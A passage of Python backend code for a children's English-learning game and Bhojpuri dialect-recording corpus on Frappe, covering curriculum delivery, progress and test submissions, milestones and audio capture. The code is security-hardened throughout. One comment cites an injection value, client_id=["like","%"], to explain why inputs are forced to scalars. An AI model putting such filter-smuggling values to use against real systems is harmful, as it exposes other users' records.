@frappe.whitelist(allow_guest=True)
def get_courses():
    """Return the full curriculum as the game's COURSES array (cached)."""
    return _cached(COURSES_CACHE_KEY, _build_courses)


def _build_courses():
    out = []
    published = frappe.get_all(
        "Track", filters={"published": 1},
        fields=["name", "track_key", "title", "title_hi", "icon", "color", "blurb", "blurb_hi", "band", "subject",
                "video", "video_title", "video_title_hi", "video_duration_secs", "video_captions", "video_captions_hi"],
        order_by="sort_order asc, creation asc",
    )
    for t in published:
        out.append(_track_json(t, with_content=True))

    # locked / coming-soon tracks (shown greyed in the game, no lessons)
    locked = frappe.get_all(
        "Track", filters={"published": 0},
        fields=["name", "track_key", "title", "title_hi", "icon", "color", "blurb", "blurb_hi", "band", "subject"],
        order_by="sort_order asc, creation asc",
    )
    for t in locked:
        out.append(_track_json(t, with_content=False))
    return out


@frappe.whitelist(allow_guest=True)
def get_structure():
    """Grade bands + subjects metadata for the Class 1–10 navigation (cached)."""
    return _cached(STRUCTURE_CACHE_KEY, _build_structure)


def _build_structure():
    bands = frappe.get_all(
        "Grade Band", filters={"published": 1},
        fields=["band_key", "title", "title_hi", "subtitle", "subtitle_hi", "icon", "color"],
        order_by="sort_order asc, creation asc",
    )
    subjects = frappe.get_all(
        "Subject",
        fields=["subject_key", "title", "title_hi", "icon", "color"],
        order_by="sort_order asc, creation asc",
    )
    return {
        "bands": [{"key": b.band_key, "title": b.title, "titleHi": b.title_hi,
                   "subtitle": b.subtitle or "", "subtitleHi": b.subtitle_hi or "",
                   "icon": b.icon or "📚", "color": b.color or "#6c5ce7"} for b in bands],
        "subjects": [{"key": s.subject_key, "title": s.title, "titleHi": s.title_hi,
                      "icon": s.icon or "📘", "color": s.color or "#6c5ce7"} for s in subjects],
    }


def _split_lines(s):
    return [x.strip() for x in (s or "").split("\n") if x.strip() != ""]


def _track_json(t, with_content):
    track = {
        "key": t.track_key, "title": t.title, "titleHi": t.title_hi,
        "icon": t.icon, "color": t.color, "blurb": t.blurb, "blurbHi": t.blurb_hi,
        "band": t.get("band") or "", "subject": t.get("subject") or "",
        "published": bool(with_content), "lessons": [],
    }
    if not with_content:
        return track

    # Explainer video (optional, streams online-only — the game shows a friendly
    # offline card when unreachable). Keys are simply absent when no video is set,
    # so old caches and the bundled fallback COURSES need no migration.
    if (t.get("video") or "").strip():
        track["videoUrl"] = t.video.strip()
        track["videoTitle"] = t.get("video_title") or ""
        track["videoTitleHi"] = t.get("video_title_hi") or ""
        if _int(t.get("video_duration_secs")):
            track["videoDuration"] = _int(t.get("video_duration_secs"))
        if (t.get("video_captions") or "").strip():
            track["videoCaptions"] = t.video_captions.strip()
        if (t.get("video_captions_hi") or "").strip():
            track["videoCaptionsHi"] = t.video_captions_hi.strip()

    lessons = frappe.get_all(
        "Lesson", filters={"track": t.name, "published": 1},
        fields=["name", "lesson_key", "title", "title_hi",
                "video", "video_title", "video_title_hi", "video_duration_secs"],
        order_by="sort_order asc, creation asc",
    )
    for l in lessons:
        words = []
        for w in frappe.get_all("Lesson Word", filters={"parent": l.name},
                                fields=["en", "hi", "pron", "emoji", "word_type", "uncountable", "plural", "use_en", "use_hi"],
                                order_by="idx asc"):
            word = {"en": w.en, "hi": w.hi, "pron": w.pron, "emoji": w.emoji}
            if w.word_type:
                word["type"] = w.word_type
            if w.use_en:
                word["use"] = w.use_en
                word["useHi"] = w.use_hi or ""
            if w.uncountable:
                word["uncount"] = True
            else:
                word["plural"] = w.plural or (w.en + "s")
            words.append(word)

        dialogues = []
        for d in frappe.get_all("Dialogue", filters={"lesson": l.name},
                                fields=["name", "who", "line", "line_hi", "followup"],
                                order_by="sort_order asc, creation asc"):
            replies = [{"text": r.text, "textHi": r.text_hi or "", "ok": bool(r.is_correct)}
                       for r in frappe.get_all("Dialogue Reply", filters={"parent": d.name},
                                               fields=["text", "text_hi", "is_correct"], order_by="idx asc")]
            dialogues.append({"who": d.who or "🙂", "line": d.line, "lineHi": d.line_hi,
                              "then": d.followup, "replies": replies})

        capture = []
        for p in frappe.get_all("Dialect Prompt", filters={"lesson": l.name},
                                fields=["prompt_key", "prompt_text_hi", "prompt_text_en",
                                        "category", "complexity_tier"],
                                order_by="sort_order asc, creation asc"):
            capture.append({"key": p.prompt_key, "hi": p.prompt_text_hi,
                            "en": p.prompt_text_en or "", "category": p.category or "",
                            "tier": _int(p.complexity_tier) or 1})

        code = []
        for c in frappe.get_all("Lesson Code", filters={"parent": l.name},
                                fields=["prompt", "prompt_hi", "teach", "teach_hi", "code", "choices", "answer"],
                                order_by="idx asc"):
            code.append({
                "prompt": c.prompt, "promptHi": c.prompt_hi,
                "teach": c.teach or "", "teachHi": c.teach_hi or "",
                "lines": (c.code or "").split("\n"),
                "choices": _split_lines(c.choices),
                "answer": (c.answer or "").strip(),
            })

        fix = []
        for x in frappe.get_all("Lesson Fix", filters={"parent": l.name},
                                fields=["sentence", "wrong_word", "correction", "teach", "teach_hi"],
                                order_by="idx asc"):
            fix.append({
                "sentence": x.sentence, "wrongWord": x.wrong_word, "fix": x.correction,
                "teach": x.teach or "", "teachHi": x.teach_hi or "",
            })

        email = []
        for e in frappe.get_all("Lesson Email", filters={"parent": l.name},
                                fields=["scenario", "scenario_hi", "spec_json"],
                                order_by="idx asc"):
            try:
                spec = json.loads(e.spec_json or "{}")
            except Exception:
                spec = {}
            email.append({
                "scenario": e.scenario, "scenarioHi": e.scenario_hi or "",
                "to": spec.get("to", ""), "from": spec.get("from", ""),
                "slots": spec.get("slots", []),
            })

        quiz = []
        for q in frappe.get_all("Lesson Quiz", filters={"parent": l.name},
                                fields=["question", "question_hi", "emoji", "choices", "answer", "teach", "teach_hi"],
                                order_by="idx asc"):
            quiz.append({
                "q": q.question, "qHi": q.question_hi or "", "emoji": q.emoji or "",
                "choices": _split_lines(q.choices),
                "answer": (q.answer or "").strip(), "teach": q.teach or "", "teachHi": q.teach_hi or "",
            })

        read = []
        for r in frappe.get_all("Lesson Read", filters={"parent": l.name},
                                fields=["title", "title_hi", "emoji", "passage", "passage_hi",
                                        "question", "question_hi", "choices", "answer", "teach", "teach_hi"],
                                order_by="idx asc"):
            read.append({
                "title": r.title or "", "titleHi": r.title_hi or "", "emoji": r.emoji or "",
                "text": r.passage or "", "textHi": r.passage_hi or "",
                "q": r.question or "", "qHi": r.question_hi or "",
                "choices": _split_lines(r.choices), "answer": (r.answer or "").strip(),
                "teach": r.teach or "", "teachHi": r.teach_hi or "",
            })

        reply = []
        for e in frappe.get_all("Lesson Reply", filters={"parent": l.name},
                                fields=["from_name", "subject", "message", "message_hi", "spec_json"],
                                order_by="idx asc"):
            try:
                spec = json.loads(e.spec_json or "{}")
            except Exception:
                spec = {}
            reply.append({
                "from": e.from_name or "", "subject": e.subject or "",
                "msg": e.message or "", "msgHi": e.message_hi or "",
                "slots": spec.get("slots", []),
            })

        ld = {
            "key": l.lesson_key, "title": l.title, "titleHi": l.title_hi,
            "words": words, "dialogues": dialogues, "code": code, "fix": fix,
            "email": email, "quiz": quiz, "read": read, "reply": reply,
            "capture": capture,
        }
        # optional per-lesson explainer video (YouTube link or file URL) — keys absent when unset
        if (l.get("video") or "").strip():
            ld["videoUrl"] = l.video.strip()
            ld["videoTitle"] = l.get("video_title") or ""
            ld["videoTitleHi"] = l.get("video_title_hi") or ""
            if _int(l.get("video_duration_secs")):
                ld["videoDuration"] = _int(l.get("video_duration_secs"))
        track["lessons"].append(ld)

    # Module test: the question bank ships WITH the curriculum so tests work fully
    # offline (answers therefore exist in the client payload — accepted tradeoff: the
    # audience is not dev-tools-savvy, and the anti-cheat targets the realistic threat
    # of switching apps to ask/look up, not payload inspection). teach/teach_hi are
    # deliberately NOT exported — no hints inside a test.
    mt = frappe.db.get_value("Module Test", {"track": t.name, "active": 1},
                             ["name", "questions_per_paper", "pass_pct", "time_limit_secs",
                              "intro", "intro_hi"], as_dict=True)
    if mt:
        bank = [{"id": q.name, "q": q.question, "qHi": q.question_hi or "",
                 "emoji": q.emoji or "", "choices": _split_lines(q.choices),
                 "answer": (q.answer or "").strip()}
                for q in frappe.get_all("Module Test Question", filters={"parent": mt.name},
                                        fields=["name", "question", "question_hi", "emoji",
                                                "choices", "answer"], order_by="idx asc")]
        if bank:
            track["test"] = {"questionsPerPaper": _int(mt.questions_per_paper) or 10,
                             "passPct": _int(mt.pass_pct) or 60,
                             "timeLimitSecs": _int(mt.time_limit_secs) or 600,
                             "intro": mt.intro or "", "introHi": mt.intro_hi or "",
                             "bank": bank}
    return track


@frappe.whitelist(allow_guest=True)
def get_settings():
    return _cached(SETTINGS_CACHE_KEY, _build_settings)


def _build_settings():
    s = frappe.get_single("Hikmat Settings")
    return {
        "appName": s.app_name or "Hikmat",
        "logo": s.logo or "",
        "taglineEn": s.tagline_en or "Learn English by playing",
        "taglineHi": s.tagline_hi or "",
        "defaultLanguage": s.default_language or "en",
        "helpDefaultOn": bool(s.help_default_on),
        "defaultTheme": s.get("default_theme") or "light",
        "defaultSound": bool(s.get("default_sound")),
        # Only the on/off flags are public — the model, endpoints, system prompt and crisis
        # copy stay server-side (read from the Single inside ai_ask/ai_transcribe/ai_tts),
        # never in this cached payload that any guest can fetch.
        "aiEnabled": bool(s.get("ai_enabled")),
        "voiceEnabled": bool(s.get("voice_enabled")),
        # Belt thresholds ship with settings so gate DETECTION works fully offline;
        # CLEARING stays server-side (Evaluation status, synced via get_progress).
        "milestones": [{"key": m.milestone_key, "title": m.title, "titleHi": m.title_hi or "",
                        "icon": m.icon or "🏅", "threshold": m.threshold_gems}
                       for m in _active_milestones()],
    }


# ---------------------------------------------------------------------------
# Progress write (untrusted input — validate + clamp + flood-cap)
# ---------------------------------------------------------------------------
@frappe.whitelist(allow_guest=True)
def submit_attempt(student=None, token=None, track=None, lesson=None, activity=None,
                   stars=0, score=0, total=0, coins=0, duration_secs=0, client_id=None):
    """Record one finished activity. Called by the game on the result screen.
    Everything here is attacker-controllable, so: verify the student exists & is
    active, require the student's login token (no forging attempts for others),
    clamp every number to sane bounds, and cap write volume per IP.
    client_id makes the write idempotent — a retry after a partial success (the
    classic offline-queue double-insert) returns the existing row instead of a copy."""
    if not _rate_ok("submit:" + _client_ip(), 3000, 3600):   # flood ceiling; well above a real classroom
        return {"ok": False, "error": "rate_limited"}
    # Scalars only (see _docname): `student` is an SQL bind + a Link write, and `client_id` is
    # the dedup FILTER value — client_id=["like","%"] would otherwise match a CLASSMATE's row
    # and return her attempt name as this call's "dedup" answer. Content keys are normalised
    # once here (see _content_key) because they are stored AND rendered in Desk reports.
    student, client_id = _docname(student), _docname(client_id, 64)
    track, lesson, activity = _content_key(track), _content_key(lesson), _content_key(activity)
    if not student:
        student = _session_student()                         # online client authed by session, may omit id
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if client_id:                                            # already recorded this exact attempt? done.
        existing = frappe.db.get_value("Lesson Attempt", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}
    sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):                      # campus token OR online session
        return {"ok": False, "error": "auth"}

    total = max(0, _int(total))
    score = max(0, _int(score))
    if total:
        score = min(score, total)
    try:
        doc = frappe.get_doc({
            "doctype": "Lesson Attempt", "client_id": client_id or None,
            "student": student, "student_name": sinfo.get("student_name"), "cohort": sinfo.get("cohort"),
            "track": track, "lesson": lesson, "activity": activity,   # normalised above
            "stars": max(0, min(3, _int(stars))),          # an activity is worth 0–3 stars
            "score": score, "total": total,
            "coins": max(0, min(1000, _int(coins))),
            "duration_secs": max(0, min(7200, _int(duration_secs))),   # 2h cap kills left-open-overnight noise
            "attempted_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:                       # raced with another submit of the same client_id
        frappe.db.rollback()
        existing = frappe.db.get_value("Lesson Attempt", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.commit()
    gate = _check_milestones(student, sinfo)                 # belt threshold crossed? (never blocks the write)
    out = {"ok": True, "name": doc.name}
    if gate:
        out["milestone"] = gate
    return out


_TEST_STATUS = {"completed": "Completed", "exited": "Exited", "timed_out": "Timed Out"}


@frappe.whitelist(allow_guest=True)
def submit_test(student=None, token=None, track=None, paper=None, score=0, total=0,
                status=None, exit_reason=None, duration_secs=0, lang=None, client_id=None):
    """Record one module-test attempt (the mandatory end-of-track test). Same
    hardening as submit_attempt: rate cap, client_id idempotency, active-student +
    token check, clamps. Two rules are SERVER-enforced so the client can't soften
    them: an Exited (anti-cheat voided) attempt always scores 0, and pass/fail is
    recomputed here against the Module Test's pass_pct — a timed-out paper still
    counts what was answered (running out of time is not cheating)."""
    if not _rate_ok("testsub:" + _client_ip(), 600, 3600):   # tests are ~10× rarer than activities
        return {"ok": False, "error": "rate_limited"}
    student, client_id = _docname(student), _docname(client_id, 64)   # scalars only, as submit_attempt
    track, lang = _content_key(track), _content_key(lang, 10)         # stored AND used as a filter below
    if not student:
        student = _session_student()
    if not student:
        return {"ok": False, "error": "unknown_student"}
    if client_id:
        existing = frappe.db.get_value("Test Attempt", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}
    sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):
        return {"ok": False, "error": "auth"}

    st = _TEST_STATUS.get(_docname(status, 20).lower())   # a dict/list here is simply not a status
    if not st:
        return {"ok": False, "error": "bad_status"}
    total = max(0, _int(total))
    score = min(max(0, _int(score)), total)
    if st == "Exited":                                       # voiding is not client-optional
        score = 0
    # exit_reason is a client-authored LABEL ("tab_hidden", "blur") that the facilitator's
    # test report renders and exports — identifier-shaped, not her prose, so it gets the
    # formula-lead strip too (see _no_formula_lead).
    exit_reason = _content_key(exit_reason, 40) if st == "Exited" else ""
    try:
        ids = json.loads(paper or "[]")
        ids = [str(x)[:140] for x in ids[:100]] if isinstance(ids, list) else []
    except Exception:
        ids = []                                             # telemetry only — never reject the write

    pass_pct = 60
    track_doc = frappe.db.get_value("Track", {"track_key": track}, "name")   # scalar (see above)
    if track_doc:
        pass_pct = _int(frappe.db.get_value("Module Test", {"track": track_doc}, "pass_pct")) or 60
    pct = round(100 * score / total) if total else 0
    passed = 1 if st in ("Completed", "Timed Out") and pct >= pass_pct else 0

    try:
        doc = frappe.get_doc({
            "doctype": "Test Attempt", "client_id": client_id or None,
            "student": student, "student_name": sinfo.get("student_name"), "cohort": sinfo.get("cohort"),
            "track": track, "paper": json.dumps(ids),
            "score": score, "total": total, "pct": pct, "passed": passed,
            "status": st, "exit_reason": exit_reason,
            "duration_secs": max(0, min(7200, _int(duration_secs))),
            "lang": lang,
            "attempted_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:                       # raced with a retry of the same client_id
        frappe.db.rollback()
        existing = frappe.db.get_value("Test Attempt", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.commit()
    return {"ok": True, "name": doc.name, "passed": bool(passed), "pct": pct}


# ---------------------------------------------------------------------------
# Milestone "belt" gates — configurable star thresholds; crossing one creates a
# Pending Evaluation (an in-person facilitator rubric) and notifies facilitators.
# Clearing is server-authoritative: a facilitator marks the Evaluation Passed in
# Desk; the client syncs gate status down via get_progress.
# ---------------------------------------------------------------------------
def _active_milestones():
    """Active milestones, cheapest-first. Cached with the settings payload lifecycle."""
    return frappe.get_all("Hikmat Milestone", filters={"active": 1},
                          fields=["milestone_key", "title", "title_hi", "icon", "threshold_gems"],
                          order_by="threshold_gems asc")


def _total_gems(student):
    """A student's global gem total 💎 = SUM of coins over every lesson attempt
    (score*5 + stars*10 each) PLUS every Boli XP Ledger award — mirrors the client's
    state.coins, and unlike stars it keeps growing on replays and on corpus work, so
    both practice and dialect contributions count toward the next belt."""
    r = frappe.db.sql(
        "select coalesce(sum(coins), 0) from `tabLesson Attempt` where student=%s", student)
    base = int(r[0][0]) if r else 0
    b = frappe.db.sql(
        "select coalesce(sum(points), 0) from `tabBoli XP Ledger` where student=%s", student)
    return base + (int(b[0][0]) if b else 0)


def _check_milestones(student, sinfo):
    """After a committed attempt: create a Pending Evaluation for every newly-crossed
    active milestone and ping the facilitators. Failures here must never undo the
    attempt (already committed), so everything is wrapped and rolled back on error.
    Returns the highest newly-crossed milestone key (for the client's celebration)."""
    try:
        milestones = _active_milestones()
        if not milestones:
            return None
        total = _total_gems(student)
        campus = frappe.db.get_value("Student", student, "campus")
        crossed = None
        for m in milestones:
            if total < (m.threshold_gems or 0):
                break                                        # sorted ascending — nothing further is reached
            if frappe.db.exists("Evaluation", {"student": student, "milestone": m.milestone_key}):
                continue                                     # already pending/passed — one row per belt, ever
            frappe.get_doc({
                "doctype": "Evaluation", "student": student,
                "student_name": sinfo.get("student_name"), "cohort": sinfo.get("cohort"),
                "campus": campus, "milestone": m.milestone_key,
                "threshold_gems": m.threshold_gems, "gems_at_reach": total,
                "status": "Pending", "reached_on": frappe.utils.now(),
            }).insert(ignore_permissions=True)
            frappe.db.commit()
            _notify_facilitators(
                "🏅 %s reached %s (%s💎) — evaluation needed" %
                (sinfo.get("student_name") or student, m.title, total),
                "Evaluation", "EV-%s-%s" % (student, m.milestone_key))
            crossed = m.milestone_key
        return crossed
    except Exception:
        frappe.db.rollback()
        frappe.log_error(frappe.get_traceback(), "hikmat milestone check")
        return None


def validate_cohort(doc, method=None):
    """doc_events hook: mandatory_depends_on only guards the Desk FORM — enforce the
    same rule server-side so an API/script insert can't create an undated Offline batch."""
    if (doc.mode or "Offline") == "Offline" and not doc.start_date:
        frappe.throw(_("An Offline cohort needs a start date."), frappe.MandatoryError)


def stamp_evaluation(doc, method=None):
    """doc_events hook: when a facilitator sets an outcome in Desk, stamp who/when."""
    if doc.status in ("Passed", "Needs Practice") and not doc.evaluated_on:
        doc.evaluated_by = frappe.session.user
        doc.evaluated_on = frappe.utils.now()


# ---------------------------------------------------------------------------
# "Roshni, mujhe doubt hai" — a learner taps for help; we log it for the
# facilitator confusion heatmap. Untrusted input → validate, clamp, flood-cap.
# Guests may raise doubts too (anonymous confusion data is still useful to a
# teacher watching the room), so a student id is optional here.
# ---------------------------------------------------------------------------
@frappe.whitelist(allow_guest=True)
def report_doubt(student=None, token=None, track=None, lesson=None, activity=None,
                 question=None, lang=None, client_id=None):
    """Record one 'I'm stuck' tap. Idempotent on client_id so the offline queue can
    retry safely. A logged-in student must present their token (no forging for others);
    an anonymous/guest doubt is accepted with no student attached."""
    if not _rate_ok("doubt:" + _client_ip(), 2000, 3600):   # generous ceiling; never trips real classroom use
        return {"ok": False, "error": "rate_limited"}
    student, client_id = _docname(student), _docname(client_id, 64)   # scalars only (see _docname)
    track, lesson, activity = _content_key(track), _content_key(lesson), _content_key(activity)
    lang = _content_key(lang, 10)
    # Her question is FREE TEXT: keep her words (the facilitator has to read them), drop the
    # markup. It is stored on Lesson Doubt AND copied into the Desk bell below, so an
    # unsanitised value would execute in two places, not one.
    question = _plain_text(question)[:500]
    if client_id:                                            # already logged this tap? done.
        existing = frappe.db.get_value("Lesson Doubt", {"client_id": client_id}, "name")
        if existing:
            return {"ok": True, "name": existing, "dedup": True}

    sname, cohort = None, None
    if not student:
        student = _session_student()                         # online client may rely on its session
    if student:
        sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
        if not sinfo or not sinfo.active:
            return {"ok": False, "error": "unknown_student"}
        if not _authorized(student, token):                  # campus token OR online session
            return {"ok": False, "error": "auth"}
        sname, cohort = sinfo.get("student_name"), sinfo.get("cohort")

    try:
        doc = frappe.get_doc({
            "doctype": "Lesson Doubt", "client_id": client_id or None,
            "student": student or None, "student_name": sname, "cohort": cohort,
            "track": track, "lesson": lesson, "activity": activity,   # normalised above
            "question": question, "lang": lang,
            "raised_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:                       # raced with another retry of the same client_id
        frappe.db.rollback()
        existing = frappe.db.get_value("Lesson Doubt", {"client_id": client_id}, "name")
        return {"ok": True, "name": existing, "dedup": True}
    frappe.db.commit()
    # Ping the facilitators' Desk so "I'm stuck" reaches a human (AI tutor is deferred).
    who = sname or _("a learner")
    _notify_facilitators(_("🙋 Doubt from {0}: {1}").format(who, question[:80]),   # already plain text
                         "Lesson Doubt", doc.name)
    return {"ok": True, "name": doc.name}


# ---------------------------------------------------------------------------
# Boli (बोली) — the Champaran Bhojpuri corpus pipeline (Record → Transcribe →
# Verify → Curate). Recording is stage 1; a clip only enters the corpus and
# pays full XP once independent students verify its transcription. Every XP
# value, threshold and lease timing lives in Hikmat Settings.boli so PAs tune
# them without a redeploy — _boli_cfg() overlays that JSON on these defaults.
# ---------------------------------------------------------------------------
_BOLI_DEFAULTS = {
    "xp_recorded": 5, "xp_operator_assist": 2, "xp_transcription_verified": 20,
    "xp_speaker_credit": 10, "xp_verification_match": 5, "xp_gold_passed": 5,
    "xp_curation_done": 5, "xp_gem_awarded": 25, "xp_elder_verified": 30,
    "xp_classroom_present": 2,
    "verifier_unlock": 15,               # own accepted transcriptions before Verify unlocks
    "curator_unlock_verified": 10, "curator_unlock_verifications": 20,
    "gold_check_pct": 10, "verifier_accuracy_floor": 0.6,
    "accepts_to_verify": 2, "max_rework_rounds": 2,
    "queue_batch": 8, "lease_ttl_secs": 6 * 3600,   # long lease: cloud + intermittent internet
}


def _boli_cfg():
    """Boli tunables: the defaults above overlaid with the Hikmat Settings `boli` JSON
    blob (PA-editable, no redeploy). A missing/invalid setting simply falls back."""
    cfg = dict(_BOLI_DEFAULTS)
    try:
        raw = frappe.db.get_single_value("Hikmat Settings", "boli")
        if raw:
            cfg.update(json.loads(raw) if isinstance(raw, str) else dict(raw))
    except Exception:
        pass
    return cfg


def _award_xp(student, event, points, clip=None, dedup_key=None, student_name=None):
    """Append one server-authored Boli XP row — the ledger is the single source of truth
    for corpus XP, folded into gems by _total_gems(). Idempotent on dedup_key so replays
    and retries never double-award (e.g. dedup_key='verified:<clip>')."""
    if not student or not _int(points):
        return
    if dedup_key and frappe.db.get_value("Boli XP Ledger", {"dedup_key": dedup_key}, "name"):
        return
    if student_name is None:
        student_name = frappe.db.get_value("Student", student, "student_name")
    try:
        frappe.get_doc({
            "doctype": "Boli XP Ledger", "student": student, "student_name": student_name,
            "event": event, "points": _int(points), "clip": clip,
            "dedup_key": (dedup_key or "")[:140] or None, "awarded_on": frappe.utils.now(),
        }).insert(ignore_permissions=True)
    except frappe.DuplicateEntryError:                       # raced with the same dedup_key
        frappe.db.rollback()


_AGE_BANDS = [(13, 15, "13-15"), (16, 18, "16-18"), (19, 25, "19-25"),
              (26, 40, "26-40"), (41, 60, "41-60")]


def _age_to_band(age):
    age = _int(age)
    if not age:
        return None
    for lo, hi, band in _AGE_BANDS:
        if lo <= age <= hi:
            return band
    return "60+" if age > 60 else None


def _valid_village(v):
    v = _docname(v)          # scalars only: a dict would reach frappe.db.exists as a FILTER
    return v if (v and frappe.db.exists("Boli Village", v)) else None


_SPK_RELATIONS = ("self", "family-elder", "neighbor", "other")


def _resolve_boli_speaker(student, relation=None, age_band=None, gender=None,
                          village=None, consent_status=None):
    """Return a Boli Speaker for this clip. A 'self' clip reuses (or creates once) the
    learner's own pseudonymous CHM-SPK id so all her recordings share one speaker; a
    family/neighbour speaker is a fresh pseudonymous row carrying demographics only —
    never a name (Boli Speaker.student is the sole real-name link, and elders get none)."""
    relation = (_docname(relation, 40) or "self").lower()
    if relation not in _SPK_RELATIONS:
        relation = "other"
    # age_band / gender are Select fields (frappe checks the VALUE); coerce to a scalar first so
    # a dict can't be stored via the `age_band or …` fallback below.
    age_band, gender = _docname(age_band, 20), _docname(gender, 20)
    village = _valid_village(village)
    if relation == "self":
        existing = frappe.db.get_value("Boli Speaker", {"student": student, "relation": "self"}, "name")
        if existing:
            return existing
        ag = frappe.db.get_value("Student", student, ["age", "gender"], as_dict=True) or {}
        return frappe.get_doc({
            "doctype": "Boli Speaker", "student": student, "relation": "self",
            "age_band": age_band or _age_to_band(ag.get("age")),
            "gender": gender or ag.get("gender"),
            "village_or_block": village, "consent_status": consent_status or "self_consented",
        }).insert(ignore_permissions=True).name
    return frappe.get_doc({
        "doctype": "Boli Speaker", "relation": relation,
        "age_band": age_band or None, "gender": gender or None,
        "village_or_block": village, "consent_status": consent_status or "verbal_elder_consent",
    }).insert(ignore_permissions=True).name


_PROMPT_TYPES = ("in_class", "elder_home", "image", "free")


# ---------------------------------------------------------------------------
# Boli stage 1 — Record ("बोल"). A learner records a prompt in someone's boli
# (herself, or a family elder / neighbour) and the clip enters the pipeline at
# status=recorded. Transcription is NO LONGER done here — a *different* student
# transcribes it in stage 2. Audio is a PRIVATE File on the Dialect Capture row
# (Desk-only, never served to guests). Untrusted input → same hardening as
# submit_attempt: rate caps, active-student + token check, clamps, client_id
# idempotency for the offline outbox.
# ---------------------------------------------------------------------------
_CAPTURE_AUDIO_MAX = 8 * 1024 * 1024   # 8MB ≈ a 3-minute 16kHz WAV, the client's hard limit

# upload mimetype → stored file extension (anything unrecognised is kept as .bin)
_CAPTURE_EXT = {"audio/wav": ".wav", "audio/webm": ".webm",
                "audio/mp4": ".m4a", "audio/mpeg": ".mp3"}


def _private_files_dir():
    return frappe.utils.get_files_path(is_private=1)


def _unshare_capture_bytes(file_doc, want, audio_bytes):
    """ONE CLIP, ONE FILE ON DISK — a right-to-erasure control, not tidiness.

    Frappe dedups uploads on {content_hash, is_private} with no parent scoping
    (file.py save_file → `duplicate_file`): two byte-identical clips get ONE path, and
    File.on_trash then refuses to unlink while any other File row shares the hash
    (file.py _delete_file_on_disk). Erasing girl A therefore left her audio on disk,
    still downloadable through girl B's clip. Identical buffers are not hypothetical:
    a muted mic or a failed take produces the same fixed-size silence for every child.

    So when Frappe handed this clip somebody else's path, write the clip its own copy and
    repoint the File row at it. Erasure then unlinks exactly this clip's bytes (see
    _erase_capture_bytes) and nobody else's. Bytes are written before the caller's commit,
    exactly like Frappe's own upload, so a rollback can leave them orphaned with no row —
    harmless (nothing serves them) and reclaimed by purge_orphan_capture_files()."""
    if not file_doc.file_url or file_doc.file_url.rsplit("/", 1)[-1] == want:
        return                          # not deduped: this clip already owns its path
    stem, ext = os.path.splitext(want)
    if os.path.exists(os.path.join(_private_files_dir(), want)):
        want = "%s-%s%s" % (stem, frappe.generate_hash(length=6), ext)   # never clobber
    with open(os.path.join(_private_files_dir(), want), "wb") as fh:
        fh.write(audio_bytes)
        os.fsync(fh.fileno())
    # content_hash stays as-is (it describes the bytes): the twin's File row keeps its own
    # path, so both recordings can be deleted independently.
    file_doc.db_set({"file_url": "/private/files/" + want, "file_name": want},
                    update_modified=False)


@frappe.whitelist(allow_guest=True)
def submit_dialect_capture(student=None, token=None, track=None, lesson=None,
                           prompt_key=None, prompt_text_hi=None, transcription=None,
                           duration_secs=0, client_id=None, operator=None, prompt_type=None,
                           category=None, tier=None, speaker_relation=None, speaker_age_band=None,
                           speaker_gender=None, village_or_block=None, consent_status=None,
                           public_ok=0, sample_rate=0, device_id=None):
    """Record one spoken dialect capture (multipart POST, file field 'audio').
    Thin wrapper: reads the upload off the request, then hands everything to
    _save_dialect_capture so tests can hit the real logic without a request."""
    f = frappe.request.files.get("audio") if getattr(frappe, "request", None) else None
    audio_bytes = f.read() if f else None
    mimetype = f.mimetype if f else None
    return _save_dialect_capture(audio_bytes, mimetype, student=student, token=token,
                                 track=track, lesson=lesson, prompt_key=prompt_key,
                                 prompt_text_hi=prompt_text_hi, transcription=transcription,
                                 duration_secs=duration_secs, client_id=client_id,
                                 operator=operator, prompt_type=prompt_type, category=category,
                                 tier=tier, speaker_relation=speaker_relation,
                                 speaker_age_band=speaker_age_band, speaker_gender=speaker_gender,
                                 village_or_block=village_or_block, consent_status=consent_status,
                                 public_ok=public_ok, sample_rate=sample_rate, device_id=device_id)


def _save_dialect_capture(audio_bytes, mimetype, student=None, token=None, track=None,
                          lesson=None, prompt_key=None, prompt_text_hi=None,
                          transcription=None, duration_secs=0, client_id=None, operator=None,
                          prompt_type=None, category=None, tier=None, speaker_relation=None,
                          speaker_age_band=None, speaker_gender=None, village_or_block=None,
                          consent_status=None, public_ok=0, sample_rate=0, device_id=None):
    """Validate + store one capture. Requires a real logged-in student (audio of a
    child is personal data — no anonymous/guest captures, unlike report_doubt).
    client_id makes the write idempotent so the offline outbox can retry safely."""
    # Captures are rarer than attempts, and each one writes audio bytes to disk — so this is
    # one of the two paths that fail CLOSED when the limiter is unavailable (see _rate_ok).
    # Nothing is lost: the client's outbox treats rate_limited as transient and retries.
    if not _rate_ok("capture:" + _client_ip(), 600, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}
    # scalars only (see _docname): `student` and `operator` are both fed to
    # frappe.db.get_value / frappe.db.exists, where a dict would act as an ORM FILTER and
    # resolve some arbitrary classmate — `operator` also credits XP to whoever it names.
    student, operator = _docname(student), _docname(operator)
    client_id = _docname(client_id, 64)          # ditto: it is a dedup FILTER value
    if not student:
        student = _session_student()                         # online client authed by session, may omit id
    if not student:
        return {"ok": False, "error": "unknown_student"}
    sinfo = frappe.db.get_value("Student", student, ["student_name", "cohort", "active"], as_dict=True)
    if not sinfo or not sinfo.active:
        return {"ok": False, "error": "unknown_student"}
    if not _authorized(student, token):                      # campus token OR online session
        return {"ok": False, "error": "auth"}
    if not _rate_ok("capture-stu:" + str(student), 60, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}
    if client_id:                                            # already saved this exact clip? done.
